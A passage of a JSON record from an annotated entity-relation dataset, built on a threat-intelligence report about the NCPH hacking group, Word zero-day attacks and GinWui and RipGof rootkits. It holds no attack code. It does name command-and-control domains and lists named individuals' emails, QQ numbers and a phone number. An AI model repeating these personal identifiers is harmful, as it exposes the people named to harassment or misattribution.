"pos": [0, 3], "sent_id": 69, "type": "TrojanHorse"}], [{"name": "Jet Engine Database", "pos": [7, 10], "sent_id": 69, "type": "ExploitTargetObject"}], [{"name": "March 2005", "pos": [12, 14], "sent_id": 69, "type": "Time"}], [{"name": "RipGof", "pos": [9, 10], "sent_id": 70, "type": "Attacker"}], [{"name": "Evil Security Team", "pos": [5, 8], "sent_id": 80, "type": "Attacker"}], [{"name": "Dasher", "pos": [16, 17], "sent_id": 80, "type": "GeneralVirus"}], [{"name": "PcShares", "pos": [21, 22], "sent_id": 80, "type": "TrojanHorse"}], [{"name": "April 22, 2005", "pos": [14, 18], "sent_id": 83, "type": "Time"}], [{"name": "RipGof.A", "pos": [19, 22], "sent_id": 83, "type": "Malware"}], [{"name": "Dec. 19, 2005", "pos": [25, 29], "sent_id": 83, "type": "Time"}], [{"name": "Dasher", "pos": [30, 31], "sent_id": 83, "type": "GeneralVirus"}], [{"name": "PcShare", "pos": [33, 34], "sent_id": 83, "type": "TrojanHorse"}], [{"name": "Evil Security Team", "pos": [37, 40], "sent_id": 83, "type": "Attacker"}], [{"name": "April 27, 2006", "pos": [40, 44], "sent_id": 83, "type": "Time"}], [{"name": "April 30, 2006", "pos": [49, 53], "sent_id": 83, "type": "Time"}], [{"name": "May 2, 2006", "pos": [0, 4], "sent_id": 84, "type": "Time"}], [{"name": "May 12, 2006", "pos": [0, 4], "sent_id": 85, "type": "Time"}], [{"name": "GinWui.A", "pos": [8, 11], "sent_id": 85, "type": "TrojanHorse"}], [{"name": "May 15, 2006", "pos": [0, 4], "sent_id": 86, "type": "Time"}], [{"name": "May 16, 2006", "pos": [0, 4], "sent_id": 87, "type": "Time"}], [{"name": "May 16, 2006", "pos": [0, 4], "sent_id": 88, "type": "Time"}], [{"name": "GinWui.A", "pos": [6, 9], "sent_id": 88, "type": "TrojanHorse"}], [{"name": "May 18, 2006", "pos": [0, 4], "sent_id": 89, "type": "Time"}], [{"name": "May 19, 2006", "pos": [0, 4], "sent_id": 90, "type": "Time"}], [{"name": "May 20, 2006", "pos": [0, 4], "sent_id": 91, "type": "Time"}], [{"name": "GinWui.B", "pos": [5, 8], "sent_id": 91, "type": "TrojanHorse"}], [{"name": "May 20, 2006", "pos": [0, 4], "sent_id": 92, "type": "Time"}], [{"name": "May 29, 2006", "pos": [0, 4], "sent_id": 93, "type": "Time"}], [{"name": "GinWui.C", "pos": [5, 8], "sent_id": 93, "type": "TrojanHorse"}], [{"name": "June 1, 2006", "pos": [9, 13], "sent_id": 93, "type": "Time"}], [{"name": "June 9, 2006", "pos": [18, 22], "sent_id": 93, "type": "Time"}], [{"name": "Mdropper.F", "pos": [23, 26], "sent_id": 93, "type": "Dropper"}], [{"name": "June 14, 2006", "pos": [27, 31], "sent_id": 93, "type": "Time"}], [{"name": "Daserf.A", "pos": [32, 35], "sent_id": 93, "type": "Malware"}], [{"name": "June 15, 2006", "pos": [36, 40], "sent_id": 93, "type": "Time"}], [{"name": "Mdropper.G", "pos": [41, 44], "sent_id": 93, "type": "Dropper"}], [{"name": "June 15, 2006", "pos": [45, 49], "sent_id": 93, "type": "Time"}], [{"name": "Booli.A Trojan", "pos": [50, 54], "sent_id": 93, "type": "TrojanHorse"}], [{"name": "June 16, 2006", "pos": [55, 59], "sent_id": 93, "type": "Time"}], [{"name": "Flux.E", "pos": [60, 63], "sent_id": 93, "type": "Malware"}], [{"name": "June 18, 2006", "pos": [64, 68], "sent_id": 93, "type": "Time"}], [{"name": "RipGof.B", "pos": [69, 72], "sent_id": 93, "type": "Malware"}], [{"name": "June 23, 2006", "pos": [73, 77], "sent_id": 93, "type": "Time"}], [{"name": "PPDropper.A", "pos": [78, 81], "sent_id": 93, "type": "Dropper"}], [{"name": "June 23, 2006", "pos": [81, 85], "sent_id": 93, "type": "Time"}], [{"name": "Booli.B Trojan", "pos": [86, 90], "sent_id": 93, "type": "TrojanHorse"}], [{"name": "June 25, 2006", "pos": [91, 95], "sent_id": 93, "type": "Time"}], [{"name": "GinWui.D", "pos": [96, 99], "sent_id": 93, "type": "Malware"}], [{"name": "June 26, 2006", "pos": [100, 104], "sent_id": 93, "type": "Time"}], [{"name": "GinWui.E", "pos": [105, 108], "sent_id": 93, "type": "Malware"}], [{"name": "Sept. 27, 2006", "pos": [109, 113], "sent_id": 93, "type": "Time"}], [{"name": "PPDropper.F", "pos": [114, 117], "sent_id": 93, "type": "Dropper"}], [{"name": "Sept. 30, 2006", "pos": [118, 122], "sent_id": 93, "type": "Time"}], [{"name": "GinWui.G", "pos": [123, 126], "sent_id": 93, "type": "Malware"}], [{"name": "Oct. 9, 2006", "pos": [127, 131], "sent_id": 93, "type": "Time"}], [{"name": "September 7", "pos": [140, 142], "sent_id": 93, "type": "Time"}], [{"name": "MeiGui HeiKe", "pos": [1, 3], "sent_id": 99, "type": "Attacker"}], [{"name": "www.mghacker.com", "pos": [4, 5], "sent_id": 100, "type": "Indicator"}], [{"name": "ncph2005@126.com", "pos": [15, 16], "sent_id": 110, "type": "Email"}], [{"name": "Zigong, Sichuan Province", "pos": [9, 13], "sent_id": 111, "type": "Location"}], [{"name": "China", "pos": [18, 19], "sent_id": 111, "type": "Country"}], [{"name": "WHG", "pos": [27, 28], "sent_id": 123, "type": "Attacker"}], [{"name": "NCPH", "pos": [34, 35], "sent_id": 123, "type": "AttackerGroup"}], [{"name": "GinWui", "pos": [13, 14], "sent_id": 124, "type": "MalwareFamily"}], [{"name": "whg@163.com", "pos": [7, 8], "sent_id": 128, "type": "Email"}], [{"name": "WZT", "pos": [1, 2], "sent_id": 132, "type": "Attacker"}], [{"name": "NCPH", "pos": [8, 9], "sent_id": 132, "type": "AttackerGroup"}], [{"name": "tthacker.cublog.cn", "pos": [5, 6], "sent_id": 138, "type": "Indicator"}], [{"name": "WHOIS", "pos": [0, 1], "sent_id": 140, "type": "Organization"}], [{"name": "windowsupdates.net", "pos": [3, 4], "sent_id": 141, "type": "Indicator"}], [{"name": "Jiangsu", "pos": [13, 14], "sent_id": 142, "type": "Location"}], [{"name": "Sichuan", "pos": [16, 17], "sent_id": 142, "type": "Location"}]], "labels": [{"r": "P3", "h": 2, "t": 3, "evidence": [5]}, {"r": "P33", "h": 2, "t": 4, "evidence": [5]}, {"r": "P33", "h": 20, "t": 15, "evidence": [20, 23]}, {"r": "P14", "h": 18, "t": 13, "evidence": [18, 22]}, {"r": "P14", "h": 19, "t": 13, "evidence": [18, 22]}, {"r": "P2", "h": 27, "t": 28, "evidence": [43]}, {"r": "P33", "h": 30, "t": 31, "evidence": [51, 52]}, {"r": "P23", "h": 27, "t": 26, "evidence": [40, 43]}, {"r": "P23", "h": 27, "t": 25, "evidence": [39, 43]}, {"r": "P33", "h": 32, "t": 33, "evidence": [55, 56]}, {"r": "P2", "h": 32, "t": 34, "evidence": [55, 56]}, {"r": "P21", "h": 38, "t": 37, "evidence": [64]}, {"r": "P21", "h": 39, "t": 37, "evidence": [64]}, {"r": "P33", "h": 44, "t": 43, "evidence": [69, 70]}, {"r": "P23", "h": 45, "t": 46, "evidence": [80]}, {"r": "P23", "h": 45, "t": 47, "evidence": [80]}, {"r": "P33", "h": 49, "t": 48, "evidence": [83]}, {"r": "P33", "h": 51, "t": 50, "evidence": [83]}, {"r": "P33", "h": 52, "t": 50, "evidence": [83]}, {"r": "P33", "h": 53, "t": 50, "evidence": [83]}, {"r": "P23", "h": 53, "t": 51, "evidence": [83]}, {"r": "P23", "h": 53, "t": 52, "evidence": [83]}, {"r": "P33", "h": 58, "t": 57, "evidence": [85]}, {"r": "P33", "h": 62, "t": 61, "evidence": [88]}, {"r": "P33", "h": 66, "t": 65, "evidence": [91]}, {"r": "P33", "h": 69, "t": 68, "evidence": [93]}, {"r": "P33", "h": 72, "t": 71, "evidence": [93]}, {"r": "P33", "h": 74, "t": 73, "evidence": [93]}, {"r": "P33", "h": 76, "t": 75, "evidence": [93]}, {"r": "P33", "h": 78, "t": 77, "evidence": [93]}, {"r": "P33", "h": 80, "t": 79, "evidence": [93]}, {"r": "P33", "h": 82, "t": 81, "evidence": [93]}, {"r": "P33", "h": 84, "t": 83, "evidence": [93]}, {"r": "P33", "h": 86, "t": 85, "evidence": [93]}, {"r": "P33", "h": 88, "t": 87, "evidence": [93]}, {"r": "P33", "h": 90, "t": 89, "evidence": [93]}, {"r": "P33", "h": 92, "t": 91, "evidence": [93]}, {"r": "P33", "h": 94, "t": 93, "evidence": [93]}, {"r": "P3", "h": 106, "t": 107, "evidence": [132]}, {"r": "P3", "h": 102, "t": 103, "evidence": [123]}], "title": "201211DunhamWickedRose", "sents": [["\"", "Wicked", "Rose", "\"", "and", "the", "NCPH", "Hacking", "Group", "by", "Ken", "Dunham", "&", "Jim", "Melnick"], ["Zero", "-", "day", "attacks", ",", "where", "an", "attack", "occurs", "before", "public", "knowledge", "of", "a", "vulnerability", "is", "known", ",", "is", "a", "growing", "cause", "of", "concern", "for", "security", "professionals", "in", "the", "21st", "century", "."], ["An", "unprecedented", "number", "of", "zero", "-", "day", "attacks", "took", "place", "in", "2006", ",", "largely", "involving", "Microsoft", "Office", "Files", "."], ["Ken"], ["Dunham", ",", "Director", "of", "the", "Rapid", "Response", "Team", ",", "and", "Jim", "Melnick", ",", "Director", "of", "Threat", "Operations", ",", "led", "the", "VeriSign", "iDefense", "intelligence", "team", "to", "track", "down", "Chinese", "hackers", "for", "hire", "out", "of", "China", ",", "responsible", "for", "many", "of", "the", "attacks", "in", "2006", "."], ["Wicked", "Rose", "is", "the", "ring", "-", "leader", "of", "the", "NCPH", "hacking", "group", "and", "this", "is", "the", "story", "of", "their", "maturation", "into", "significant", "global", "threat", "by", "2006", "."], ["1", "Introduction", "to", "N.C.P.H.", "N.C.P.H."], ["(", "Network", "Crack", "Program", "Hacker", ")", "has", "about", "ten", "members", "or", "associates", "."], ["Four", "core", "members", "exist", "as", "of", "2006", ":"], ["\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "(", "Wicked", ")", "Rose", "KuNgBiM", "Rodag", "Charles"], ["There", "are", "also", "some", "six", "other", "associates", "within", "NCPH", "and", "two", "other", "positions", "(", "possibly", "unfilled", "positions", ")", "whose", "purpose", "is", "unclear", "."], ["However", ",", "\u201c", "Rose", "\u201d", "or", "\u201c", "Wicked", "Rose", "\u201d", "seems", "to", "be", "the", "primary", "leader", "."], ["Membership", "rules", ",", "recruiting", "goals", "and", "standards", "are", "unknown", "."], ["However", ",", "some", "members", "appear", "to", "be", "current", "or", "former", "students", "of", "Sichuan", "University", "of", "Science", "and", "Engineering.1"], ["The", "group", "is", "responsible", "for", "development", "and", "deployment", "of", "exploit", "codes", "related", "vulnerabilities", "in", "Microsoft", "Word", "Malformed", "OLE", "Structure", "Code", "Execution", "and", "Microsoft", "Excel", "Malformed", "BIFF", "Structure", "Code", "Execution", "."], ["2", "Public", "Knowledge", "of", "a", "Zero", "-", "Day", "Word", "Exploit", "The", "story", "of", "NCPH", "zero", "-", "day", "attacks", "begins", "publicly", "on", "May", "18", ",", "2006", "."], ["On", "this", "day", "the", "Internet", "Storm", "Center", "reports", "a", "new", "possible", "zero", "-", "day", "attack", "."], ["iDefense", "worked", "closely", "with", "SANS", "and", "other", "organizations", "to", "analyze", "the", "threat", "landscape", "as", "it", "related", "to", "exploitation", "of", "this", "vulnerability", "."], ["Within", "the", "next", "36", "hours", ",", "iDefense", "gained", "access", "to", "multiple", "codes", "and", "extracted", "a", "new", "rootkit", "called", "GinWui", "."], ["Independent", "research", "proved", "the", "following", ":", "\uf0b7", "\uf0b7", "\uf0b7", "1", "Exploitation", "targeted", "a", "new", "vulnerability", "that", "allowed", "attackers", "to", "successfully", "exploit", "computers", "running", "fully", "patched", "versions", "of", "Microsoft", "Word", "2002", "and", "others", "."], ["Exploitation", "dated", "to", "May", "12", ",", "2006", "and", "involved", "at", "least", "six", "unique", "hostile", "exploit", "files", "."], ["iDefense", "confirmed", "that", "attacks", "targeted", "two", "organizations", ",", "one", "in", "the", "United", "States", "and", "one", "in", "Japan", "."], ["Chinese", "-", "authored", "rootkits", "GinWui", ".", "A", "and", "GinWui", ".", "B", "exist", "in", "several", "attacks", "."], ["iDefense", "identified", "the", "rootkits", "'", "source", "and", "authors", "as", "Chinese", "actor", "\"", "Wicked", "Rose", "\"", "and", "others", "profiled", "later", "in", "this", "report", "."], ["www.suse.edu.cn", "&", "http://www.study-in-china.org/school/Sichuan/suse/", "\uf0b7", "\uf0b7", "Successful", "installation", "of", "the", "rootkit", "requires", "Administrator", "or", "Debugger", "rights", "."], ["Initial", "exploitation", ",", "however", ",", "does", "not", "require", "Administrator", "rights", "."], ["iDefense", "identified", "unique", "malicious", "code", "attacks", "pointing", "to", "nease.net", "and", "authored", "several", "Snort", "signatures", "for", "this", "traffic", "."], ["iDefense", "continues", "to", "monitor", "other", "domains", "related", "to", "the", "attack", "."], ["The", "original", "attack", "upon", "a", "large", "DoD", "entity", "within", "the", "USA", "began", "on", "May", "12", ",", "2006", "."], ["Targets", "of"], ["the", "attacker", "were", "apparently", "\"", "Googled", "\"", "by", "the", "attacker", "."], ["Three", "variations", "of", "a", "Microsoft", "Word", "zero", "-", "day", "attack", "are", "involved", "in", "the", "attack", "."], ["A", "few", "dozen", "attack", "files", "are", "first", "distributed", "to", "less", "than", "a", "dozen", "targets", "to", "identify", "which", "version", "works", "within", "the", "organization", "."], ["Once", "attackers", "identify", "the", "vulnerable", "version", "of", "Microsoft", "Word", "used", "within", "the", "organization", "close", "to", "200", "messages", "sent", "out", "to", "multiple", "targets", "within", "the", "organization", "within", "24", "hours", "."], ["This", "second", "wave", "of", "attack", "is", "distributed", "as", "\"", "Planning", "document", "5-16-2006.doc", "\"", "."], ["This", "code", "is", "improved", "beyond", "the", "first", "variant", "sent", "out", "earlier", "to", "identify", "the", "vulnerable", "version", "of", "Word", "within", "the", "targeted", "network", "."], ["A", "third", "attack", "commences", "on", "May", "17", ",", "2006", "."], ["During", "this", "period", ",", "the", "Internet", "Storm", "Center", "and", "others", "get", "involved", "and", "the", "case", "becomes", "public", "."], ["In", "the", "end", ",", "iDefense", "identified", "six", "unique", "samples", ",", "of", "which", "three", "are", "more", "prevalent", "than", "other", "variants", "."], ["3", "The", "GinWui", "Backdoor", "Rootkit", "Payload", "Zero", "day", "attacks", "commenced", "in", "May", "2006", "attempted", "to", "install", "a", "GinWui", "backdoor", "Trojan", "horse", "and", "Windows", "rootkit", "."], ["A", "DLL", "file", "called", "winguis.dll", "and", "several", "SYS", "files", "install", "themselves", "when", "a", "computer", "is", "successfully", "attacked", "through", "an", "exploit", "."], ["Two", "versions", "of", "the", "GinWui", "rootkit", "are", "installed", "during", "several", "attacks", "in", "May", "and", "June", "2006", "."], ["NCHP", "5.0", "Screenshot", "(", "GinWui", "Rootkit", ")"], ["Wicked", "Rose", "is", "the", "author", "of", "the", "GinWui", "malicious", "code", "."], ["His", "code", "and", "support", "posts", "related", "to", "GinWui", "distributions", "exist", "on", "the", "Chinese", "NCPH", "and", "Evil", "Octal", "forums", "."], ["Wicked", "Rose", "associates", "with", "WHG", "and", "others", "on", "this", "form", "."], ["WHT", "hosted", "version", "\"", "3.0beta.3", "\"", "of", "the", "\"", "NCPH", "remote", "control", "\"", "rootkit", "code", "on", "May", "2", ",", "2006", "."], ["This", "distribution", "of", "GinWui", "was", "largely", "unknown", "and", "undetected", "by", "anti", "-", "virus", "companies", "at", "the", "time", "of", "release", "."], ["Versions", "of", "GinWui", "used", "in", "targeted", "attacks", "of", "May", "and", "June", "2006", "are", "private", "versions", ",", "not", "released", "to", "the", "public", "."], ["This", "proves", "that", "Wicked", "Rose", "either", "constructed", "the", "zero", "day", "attacks", "or", "sold", "private", "code", "to", "users", "that", "performed", "the", "attack", "."], ["Wicked", "Rose", "later", "documents", "additional", "updates", "to", "his", "rootkit", "code", ",", "version", ".50", ",", "at", "http://rodag.blogbus.com/index.html", "."], ["By", "this", "time", "Wicked", "Rose", "was", "performing", "full", "-", "time", "development", "of", "this", "malicious", "code", "as", "a", "hacker", "for", "hire", "."], ["4", "June", "21", ",", "2007", "\u2013", "Continued", "US", "Targeted", "Attacks", "Just", "over", "a", "month", "later", ",", "following", "initial", "GinWui", "based", "targeted", "attacks", ",", "another", "Microsoft", "Word", "exploit", "occurs", "on", "June", "21", ",", "2006", "."], ["A", "spoofed", "e", "-", "mail", "is", "sent", "to", "a", "target", "containing", "a", "hostile", "Microsoft", "Word", "document", "."], ["Analysis", "of", "the", "attack", "reveals", "that", "it", "'s", "likely", "a", "test", "file", "used", "to", "identify", "what", "version", "of", "Word", "may", "be", "running", "within", "the", "targeted", "organization", ",", "rather", "than", "a", "refined", "targeted", "attack", "upon", "a", "known", "version", "of", "Microsoft", "Word", "."], ["Chinese", "text", "within", "the", "Word", "document", "reveal", "Chinese", "characters", "discussing", "a", "systematic", "evaluation", "of", "offsets", "for", "Microsoft", "Word", "exploitation", ":", "RipGof", "attacks", "reveal", "a", "Chinese", "string", "related", "to", "systematic", "testing", "of", "offsets", "for", "exploitation", "."], ["5", "Backtracking", "Targeted", "Attacks", ":", "RipGof", "In", "June", "2006", "another", "targeted", "attack", "emerges", ",", "but", "it", "'s", "not", "GinWui", "this", "time", "but", "a", "new", "code", ",", "RipGof", ".", "B."], ["The", "attack", "attempts", "to", "exploit", "MS06", "-", "027", "to", "install", "RipGof", ".", "B", ",", "a", "Trojan", "horse", "."], ["This", "is", "the", "same", "exploit", "code", "used", "in", "the", "former", "Zero", "-", "Day", "attacks", "linked", "to", "Wicked", "Rose", "and", "the", "NCPH", "hacking", "group", "."], ["The", "exploit", "code", "is", "still", "private", "at", "this", "time", ",", "proving", "that", "the", "author", "of", "both", "GinWui", "and", "RipGof", "attacks", "are", "the", "same", "individual", "or", "group", "or", "affiliated", "through", "underground", "criminal", "operations", "."], ["RipGof", "."], ["B", "is", "an", "improvement", "of", "the", "former", "exploit", "used", "in", "GinWui", "attacks", "."], ["RipGof", "."], ["B", "attacks", "included", "improvements", "to", "shellcode", "that", "attempts", "to", "fork", "to", "different", "locations", "based", "upon", "the", "address", "value", "of", "the", "stack", "to", "exploit", "multiple", "versions", "of", "Microsoft", "Word", "."], ["Once", "installed", ",", "RipGof", ".", "B", "attempts", "to", "connect", "to", "enjoy.irdet.com", "and", "enjoy.bmwsee.com", "over", "TCP", "port", "80", "."], ["It", "runs", "as", "a", "rootkit", "and", "backdoor", "Trojan", "horse", "and", "phones", "home", "to", "a", "Chinese", "server", "with", "stolen", "data", "."], ["RipGof", "malicious", "code", "does", "not", "exist", "as", "a", "distribution", "in", "the", "underground", ",", "leading", "investigators", "to", "look", "into", "the", "original", "RipGof", ".", "A", "malicious", "code", "."], ["Over", "a", "year", "prior", "to", "the", "2006", "targeted", "attacks", "RipGof", "."], ["A", "emerges", "in", "the", "wild", "."], ["RipGof", ".", "A", "attempted", "to", "exploit", "the", "Jet", "Engine", "Database", "exploit", "in", "March", "2005", "."], ["This", "proves", "attempted", "exploitation", "and", "installation", "of", "code", "through", "RipGof", "for", "a", "year", "prior", "to", "more", "sophisticated", "codes", "and", "attacks", "."], ["In", "summary", ",", "RipGof", "and", "GinWui", "attacks", "both", "use", "the", "same", "private", "exploit", "code", "against", "Microsoft", "Word", "and", "both", "install", "rootkit", "based", "codes", "to", "steal", "and", "send", "information", "back", "to", "Chinese", "sources", "."], ["This", "circumstantial", "evidence", "reveals", "that", "Wicked", "Rose", "and", "the", "NCPH", "group", "likely", "began", "their", "exploitation", "efforts", "at", "least", "a", "year", "and", "a", "half", "to", "two", "years", "prior", "to", "sophisticated", "attacks", "that", "commenced", "in", "2006", "."], ["Once", "the", "group", "found", "a", "vulnerability", "within", "Microsoft", "Word"], ["they", "were", "able", "to", "improve", "upon", "it", "and", "their", "targeted", "attack", "techniques", "to", "distribute", "multiple", "targeted", "attacks", "and", "malicious", "codes", "for", "criminal", "gain", "as", "hackers", "for", "hire", "."], ["6", "Timeline", "of", "Events", "Wicked", "Rose", "and", "the", "NCPH", "hacking", "group", "are", "implicated", "in", "multiple", "Office", "based", "attacks", "over", "a", "two", "year", "period", "."], ["An", "attack", "in", "2006", "used", "RipGof", "."], ["B", "in", "the", "attack", "."], ["RipGof", "."], ["A", "first", "emerged", "a", "year", "earlier", "using", "an", "exploit", "that", "is", "relatively", "unsophisticated", "."], ["Over", "the", "next", "year", "the", "Evil", "Security", "Team", ",", "also", "out", "of", "China", ",", "creates", "the", "Dasher", "worm", "and", "uses", "the", "PcShares", "Trojan", "in", "an", "attack", "."], ["Wicked", "Rose", "gives", "a", "recommendation", "on", "the", "Trojan", "the", "day", "it", "is", "updated", "in", "the", "spring", "of", "2006", ",", "showing", "a", "close", "affiliation", "between", "Wicked", "Rose", "and", "the", "Evil", "Security", "Team", "actors", "."], ["Multiple", "attacks", "that", "take", "place", "in", "May", "and", "June", "and", "later", "2006", "are", "related", "to", "privately", "held", "exploit", "code", "for", "both", "Microsoft", "Word", "and", "Excel", ",", "proven", "to", "be", "developed", "by", "Wicked", "Rose", "."], ["A", "timeline", "of", "proven", "associated", "events", "related", "to", "Wicked", "Rose", "attacks", "is", "below", ":", "April", "22", ",", "2005", "-", "RipGof", ".", "A", "JetEngine", "DB", "Attack", "Dec.", "19", ",", "2005", "\u2013", "Dasher", "worm", "and", "PcShare", "Trojan", "attack", "by", "Evil", "Security", "Team", "April", "27", ",", "2006", "Update", "to", "windowsupdates.net", "attack", "site", "April", "30", ",", "2006", "-", "Wicked", "Rose", "Drops", "out", "of", "School"], ["May", "2", ",", "2006", "\u2013", "3.0beta3", "NCPH", "remote", "control", "(", "GinWui", ")", "public", "release"], ["May", "12", ",", "2006", "-", "Initial", "probing", "and", "GinWui", ".", "A", "exploitation", "attempts", "against", "US", "target"], ["May", "15", ",", "2006", "-", "PcShare", "Trojan", "update", "recommended", "by", "Wicked", "Rose", "on", "day", "of", "new", "release"], ["May", "16", ",", "2006", "-", "Update", "to", "windowsupdates.net", "attack", "site"], ["May", "16", ",", "2006", "-", "Multiple", "GinWui", ".", "A", "attacks", "against", "US", "target"], ["May", "18", ",", "2006", "-", "SANS", "reports", "zero", "-", "day", "attack"], ["May", "19", ",", "2006", "Update", "to", "windowsupdates.net", "attack", "site"], ["May", "20", ",", "2006", "-", "GinWui", ".", "B", "Attack"], ["May", "20", ",", "2006", "-", "WZT", "Kicked", "out", "of", "NCPH"], ["May", "29", ",", "2006", "-", "GinWui", ".", "C", "Attack", "June", "1", ",", "2006", "Update", "to", "windowsupdates.net", "attack", "site", "June", "9", ",", "2006", "\u2013", "Mdropper", ".", "F", "Attack", "June", "14", ",", "2006", "\u2013", "Daserf", ".", "A", "Attack", "June", "15", ",", "2006", "\u2013", "Mdropper", ".", "G", "Attack", "June", "15", ",", "2006", "\u2013", "Booli", ".", "A", "Trojan", "Attack", "June", "16", ",", "2006", "-", "Flux", ".", "E", "Attack", "June", "18", ",", "2006", "-", "RipGof", ".", "B", "Attack", "June", "23", ",", "2006", "\u2013", "PPDropper", ".", "A", "June", "23", ",", "2006", "\u2013", "Booli", ".", "B", "Trojan", "attack", "June", "25", ",", "2006", "-", "GinWui", ".", "D", "Attack", "June", "26", ",", "2006", "-", "GinWui", ".", "E", "Attack", "Sept.", "27", ",", "2006", "\u2013", "PPDropper", ".", "F", "Attack", "Sept.", "30", ",", "2006", "\u2013", "GinWui", ".", "G", "Attack", "Oct.", "9", ",", "2006", "\u2013", "Wicked", "Rose", "reports", "pay", "increase", ";", "likely", "in", "September", "7", "A", "Pictorial", "Introduction", "to", "Wicked", "Rose", "and", "NCPH"], ["Just", "who", "are", "Wicked", "Rose", "and", "the", "NCPH", "hacker", "group", "?"], ["As", "it", "turns", "out", ",", "a", "collection", "of", "college", "students", "in", "China", "who", "likely", "room", "with", "one", "another", "and", "regularly", "support", "their", "hacking", "interests", "."], ["In", "-", "depth", "research", "implicates", "Wicked", "Rose", "as", "the", "ring", "-", "leader", "of", "the", "group", ",", "responsible", "for", "managing", "hacker", "for", "hire", "relationships", "and", "paying", "group", "members", "for", "their", "work", "as", "hackers", "."], ["During", "the", "time", "of", "targeted", "attacks", "in", "2006", "their", "income", "increased", "significantly", ",", "to", "full", "-", "time", "wages", "for", "part", "time", "hacking", "."], ["Wicked", "Rose", ",", "leader", "of", "the", "group", ",", "is", "pictured", "below", ":", "\u73ab\u7470", "\u9ed1\u5ba2"], ["(", "MeiGui", "HeiKe", ")", "\u201c", "Rose", "Hacker", "\u201d"], ["QQ", "number", "is", "5372453", "www.mghacker.com", "Wicked", "Rose", "maintains", "a", "personal", "site", "at", "www.mghacker.com", "."], ["Wicked", "Rose", "'s", "Website", ":", "www.mghacker.com"], ["Rose", "is", "an", "approximate", "20", "-", "year", "-", "old", "(", "2006", ")", "student", "at", "the", "Sichuan", "University", "of", "Science", "&", "Engineering", "."], ["In", "the", "spring", "of", "2006", "Wicked", "Rose", "claims", "to", "have", "dropped", "out", "of", "school", "for", "full", "time", "hacking", "opportunities", "."], ["Specifically", ",", "on", "April", "30", ",", "2006", "his", "blog", "entry", "claims", "he", "did", "not", "register", "for", "his", "university", "exam", "."], ["He", "performed", "significant", "updates", "to", "his", "rootkit", "code", "from", "March", "through", "June", "2006", "."], ["He", "later", "returned", "to", "school", "by", "September", "2006", "."], ["Wicked", "Rose", "claims", "responsibility", "on", "his", "blog", "for", "targeted", "e", "-", "mail", "based", "attacks", "containing", "Microsoft", "Word", "and", "CHM", "exploits", "from", "the", "spring", "of", "2006", "."], ["Other", "NCPH", "-", "member", "websites", "include", ":", "http://rodag.blogbus.com", ",", "http://www.cppblog.com/charles", "and", "http://kungbim.blogbus.com", "."], ["The", "main", "NCPH", "website", "is", "www.ncph.net", ":", "NCPH", "Studio", "website", "www.ncph.net"], ["Registration", "information", "for", "ncph.net", "reveals", "a", "Chinese", "registrant", ":", "Registrant", "Contact", ":", "ncph", "studio", "(", "ncph2005@126.com", ")", "si", "chuan", "li", "gong", "xue", "yuan", "zigong", ",", "Sichuan", ",", "cn", "643000", "P", ":", "+86.13154663992", "F", ":", "+86.13154663992"], ["The", "main", "location", "of", "the", "NCPH", "group", "is", "in", "Zigong", ",", "Sichuan", "Province", ",", "in", "south", "-", "central", "China", "."], ["Zigong", ",", "Sichuan", "Province", ",", "in", "south", "-", "central", "China"], ["The", "NCPH", "group", "(", "NCPH", "Studio", ")", "in", "Zigong", ",", "China", ",", "is", "shown", "here", ":", "NCPH", "hackers", "at", "work", "in", "the", "\u201c", "ncph", "studio", "\u201d"], ["Left", "to", "right", ":", "\u201c", "Wicked", "Rose", ",", "\u201d", "KuNgBiM", ",", "Charles", "and", "Rodag"], ["Additional", "photos", "featuring", "Wicked", "Rose", "and", "NCPH", "hackers", "are", "below", ",", "captured", "from", "their", "various", "websites", "and", "blog", "entries", "in", "2006", "."], ["Chinese", "translation", "for", "each", "photo", "are", "below", ":", "\"", "Wicked", "Rose", "\""], ["From", "an", "ancient", "Chinese", "poem", ",", "expressing", "the", "devotion", "of", "his", "heart", "for", "hacking", "."], ["\"", "After", "you", "choose", "the", "technology", "you", "love", ",", "you", "have", "to", "research", "every", "system", "and", "code", "everyday", "!", "\""], ["Charles", ":", "\"", "Silence", "belongs", "to", "our", "world", "...", "\""], ["Charles", "\"", "Charles", "always", "laughs", "so", "brightly", "when", "searching", "for", "program", "problems", "!", "\""], ["KuNgBiM"], ["\"", "Only", "we", "can", "feel", "this", "kind", "of", "happy", "...", "\""], ["Ronag", "\"", "Behind", "every", "successful", "design", ",", "he", "always", "has", "a", "slight", "smile", "\u2026", "\"", "Wicked", "Rose", "and", "NCPH", "hacking", "photos", "WHG", "(", "\u201c", "Fig", "\u201d", ")", "WHG", "is", "not", "a", "core", "member", "of", "NCPH", "but", "a", "close", "affiliate", "of", "Wicked", "Rose", "."], ["WHG", "appears", "to", "be", "central", "to", "development", "of", "the", "NCPH", "rootkit", ",", "aka", "GinWui", "."], ["WHG", "is", "credited", "by", "Wicked", "Rose", "as", "one", "of", "the", "authors", "of", "this", "malicious", "code", "."], ["WHG", "is", "an", "experienced", "malicious", "code", "author", "with", "the", "following", "contact", "information", ":"], ["\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "E", "-", "mail", "address", ":", "QQ", "Number", ":"], ["Website", ":", "Real", "Name", ":", "Location", ":", "whg@163.com", "312016"], ["http://cnasm.com"], ["May", "be", "\"", "Zhao", "Jibing\",\u8d75\u7eaa\u658c", "."], ["Believed", "to", "be", "employed", "in", "the", "Sichuan", "province", "of", "China", "."], ["WZT", "WZT", "is", "a", "former", "member", "of", "the", "NCPH", "group", "who", "was", "kicked", "out", "during", "the", "time", "of", "zero", "-", "day", "attacks", "in", "May", "2006", "."], ["WZT", "was", "removed", "on", "May", "20", ",", "2006", "."], ["During", "this", "time", "period", "the", "zeroday", "attacks", "became", "publicly", "disclosed", ",", "increasing", "pressure", "upon", "the", "hacking", "group", "."], ["It", "is", "feasible", "that", "WZT", "may", "have", "offended", "the", "group", "in", "some", "way", "related", "to", "zero", "-", "day", "attack", "techniques", ",", "strife", "over", "hacker", "for", "hire", "deals", ",", "or", "competition", "for", "hacker", "for", "hire", "deals", "."], ["WZT", "is", "a", "former", "coding", "expert", "within", "the", "NCPH", "group", "and", "many", "years", "experience", "in", "hacking", "."], ["He", "is", "responsible", "for", "creating", "multiple", "tools", "and", "regularly", "giving", "credit", "to", "the", "infamous", "Li0n", "Chinese", "hacker", "(", "founder", "of", "Honker", "Union", "(", "HUC", ")", "Chinese", "group", "."], ["WZT", "maintains", "a", "website", "at", "tthacker.cublog.cn", "."], ["The", "Jiangsu", "Connection", "?"], ["WHOIS", "registrant", "data", "for", "related", "domains", "used", "within", "attacks", "and", 